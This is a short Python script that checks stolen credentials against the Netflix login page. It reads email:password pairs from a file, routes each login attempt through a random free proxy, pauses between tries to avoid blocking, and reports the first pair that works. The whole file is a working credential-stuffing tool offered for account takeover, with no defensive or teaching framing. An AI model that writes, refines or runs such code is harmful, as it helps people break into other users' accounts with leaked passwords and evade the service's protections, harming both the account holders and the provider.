import requests
import random
import time

LOGIN_URL = "https://www.netflix.com/login"
PROXY_API_URL = "https://www.proxy-list.download/api/v1/get?type=https"

# Fetch free proxies from the web
def fetch_proxies():
    try:
        response = requests.get(PROXY_API_URL, timeout=10)
        proxies = response.text.splitlines()
        return ["http://" + proxy for proxy in proxies if proxy]
    except Exception as e:
        print(f"Error fetching proxies: {e}")
        return []

# Read accounts from file
def read_accounts(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f]

# Attempt login with proxy
def try_login(email, password, proxy):
    try:
        session = requests.Session()
        session.proxies = {
            "http": proxy,
            "https": proxy
        }

        response = session.post(LOGIN_URL, data={
            "userLoginId": email,
            "password": password
        }, timeout=10)

        if "incorrect password" not in response.text.lower():
            return True
    except Exception as e:
        print(f"Error using proxy {proxy}: {e}")
    return False

# Main function
def main():
    accounts = read_accounts("accounts.txt")
    proxies = fetch_proxies()

    if not proxies:
        print("❌ No proxies available.")
        return

    for account in accounts:
        email, password = account.split(":")
        proxy = random.choice(proxies)
        print(f"Trying {email} with proxy {proxy}...")

        if try_login(email, password, proxy):
            print(f"✅ Working Account Found: {email}:{password}")
            return
        
        # Wait before next attempt to avoid blocking
        time.sleep(2)
        
    print("❌ No working account found.")

if __name__ == "__main__":
    main()